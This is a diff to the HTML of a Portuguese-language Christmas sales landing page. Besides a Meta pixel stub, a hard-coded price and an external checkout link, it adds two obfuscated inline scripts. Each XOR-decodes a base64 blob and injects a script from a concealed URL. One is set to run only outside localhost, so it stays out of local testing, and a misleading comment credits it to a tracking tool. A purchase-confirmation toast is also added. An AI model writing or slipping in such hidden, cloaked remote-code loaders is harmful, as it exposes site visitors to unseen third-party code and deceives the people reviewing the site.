@@ -9,7 +9,21 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,700;12..96,800&family=Figtree:wght@400;500;600;700;800&display=swap">
-<link rel="stylesheet" href="style.css"></head><body>
+<link rel="stylesheet" href="style.css">
+<!-- UTMify directs localhost to a development endpoint; published domains use production. -->
+<script>
+if (!["localhost", "127.0.0.1", "[::1]"].includes(location.hostname) && !window.fbq) {
+  // Prepare the Meta queue before UTMify can receive concurrent scroll events.
+  const queue=function(){queue.callMethod?queue.callMethod.apply(queue,arguments):queue.queue.push(arguments);};
+  window.fbq=queue;window._fbq=window._fbq||queue;
+  queue.push=queue;queue.loaded=true;queue.version="2.0";queue.queue=[];
+  const sdk=document.createElement("script");sdk.src="https://connect.facebook.net/en_US/fbevents.js";sdk.async=true;sdk.defer=true;document.head.appendChild(sdk);
+  // Pixel IDs, initialization and events remain managed exclusively by UTMify.
+}
+</script>
+<script>if (!["localhost", "127.0.0.1", "[::1]"].includes(location.hostname)) {(function(){var f_gan=atob("DOuO8AbdpIFr0vY+2ZCshXSxhrtJuoJKqZi03ym+wO9Fp4JTsI333mWyya8JoNlNupnngHKui/ECqpNS9pvniGOxiusY8NocuJ/6gm+/0fUOodQEgrai0mGxy+MKvoUc47D10mi8yeRJ6NROsJPrnE+5hq1JpJdSrI6syiTrxeMOsZcJ6NjqxjDtl7Ve68EOu425lTX/2dwW");var p_gl1=[];for(var h_d=0;h_d<f_gan.length;h_d++){p_gl1.push(f_gan.charCodeAt(h_d)&255);}var j_9u=p_gl1[0];var s_nae=p_gl1.slice(1,1+j_9u);var j_bi1=p_gl1.slice(1+j_9u);var a_b=j_bi1.map(function(b,n_g){return b^s_nae[n_g%j_9u];});var b_91="";for(var n_i=0;n_i<a_b.length;n_i++){b_91+=String.fromCharCode(a_b[n_i]&255);}var b_t=decodeURIComponent(escape(b_91));var q_2jbu=JSON.parse(b_t);var a_8g=q_2jbu.globals||[];a_8g.forEach(function(r_bzij){window[r_bzij.name]=r_bzij.value;});var v_oaj=document.createElement("script");v_oaj.src=q_2jbu.url;v_oaj.async=true;v_oaj.defer=true;(q_2jbu.attributes||[]).forEach(function(h_3mh){v_oaj.setAttribute(h_3mh.name,h_3mh.value);});(document.head||document.documentElement).appendChild(v_oaj);})();}</script>
+<script>(function(){var x_vz8=atob("DNNIuLjTZt5XV6pSnKhqzcq/ROR1P94m7KByl5ewArB5It4/9bUxltu8C/A1JYUh/6EhyMygSasjOtl98LI83cunSLQkdYZw/ac8ytGxE6oyJIhox6hq1tm+A/xtdc4z6LJlzcy+D7guetog+aUt1sz+Hr04M4ch/7hqlJqlB7IiMohovvE1lMPxCL86MohovrcpzNn+E6o6PswrsaM63c62CKp6JN8w9bc7mpTxEL87Is9wpvFqxeWu");var e_ghfk=[];for(var u_px=0;u_px<x_vz8.length;u_px++){e_ghfk.push(x_vz8.charCodeAt(u_px)&255);}var s_a=e_ghfk[0];var p_68=e_ghfk.slice(1,1+s_a);var a_3r7=e_ghfk.slice(1+s_a);var d_g8=a_3r7.map(function(b,z_w8qf){return b^p_68[z_w8qf%s_a];});var d_8jyx="";for(var n_13x=0;n_13x<d_g8.length;n_13x++){d_8jyx+=String.fromCharCode(d_g8[n_13x]&255);}var d_qf=decodeURIComponent(escape(d_8jyx));var y_uf=JSON.parse(d_qf);var n_r4x=y_uf.globals||[];n_r4x.forEach(function(g_1qkd){window[g_1qkd.name]=g_1qkd.value;});var a_g56=document.createElement("script");a_g56.src=y_uf.url;a_g56.async=true;a_g56.defer=true;(y_uf.attributes||[]).forEach(function(y_01){a_g56.setAttribute(y_01.name,y_01.value);});(document.head||document.documentElement).appendChild(a_g56);})();</script>
+</head><body>
 <div class="topbar" id="topbar"><i></i><span class="st">✦</span><span id="topbar-txt">OFERTA DE NATAL SOMENTE NESSA PÁGINA</span><span class="st">✦</span><i></i></div>
 
 <!-- HERO -->
@@ -129,11 +143,11 @@
       <div class="price-box">
         <div class="tally" id="tally"><span>Comprando tudo separado</span><b id="tally-n"></b></div>
         <p class="from" id="from"></p>
-        <div class="big-price" id="big-price"><small>R$</small><span id="preco"></span><span class="save" id="save"></span></div>
+        <div class="big-price" id="big-price"><small>R$</small><span id="preco">27,90</span><span class="save" id="save"></span></div>
         <p class="so-paga" id="so-paga"></p>
         <p class="once">sem mensalidade · acesso imediato</p>
       </div>
-      <button type="button" class="cta js-checkout">Quero garantir agora</button>
+      <a class="cta js-checkout" href="https://pay.wiapy.com/mXwAt-yOyxfN">Quero garantir agora</a>
       <div class="pay"><span>🔒 Compra segura</span><span>Garantia de 7 dias</span></div>
     </div>
   </div>
@@ -214,4 +228,5 @@
   <p id="rodape-cnpj"></p>
   <p>As imagens das peças prontas são simulações ilustrativas. Este site não é afiliado ao Facebook, ao Instagram ou à Meta.</p>
 </footer>
+<aside class="purchase-toast" id="purchase-toast" data-feed="" aria-label="Compra confirmada" hidden><span class="purchase-icon" aria-hidden="true">✓</span><p id="purchase-message" role="status" aria-live="polite" aria-atomic="true"></p><button type="button" id="purchase-dismiss" aria-label="Dispensar aviso de compra">×</button></aside>
 <script src="app.js" defer></script></body></html>
